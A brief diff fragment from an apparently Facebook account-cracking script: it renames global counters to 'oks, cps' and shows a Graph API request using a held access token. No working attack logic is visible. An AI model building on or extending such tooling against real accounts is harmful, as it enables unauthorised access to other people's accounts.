@@ -275,7 +275,7 @@ def black():
 	hacker(S + '[☆]' + P + ' To stop process 1st click on CTRL then Z')
 	print (S + 46*'✵')
 	def main(arg):
-		global error, live
+		global oks, cps
 		user=arg
 		try:
 			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
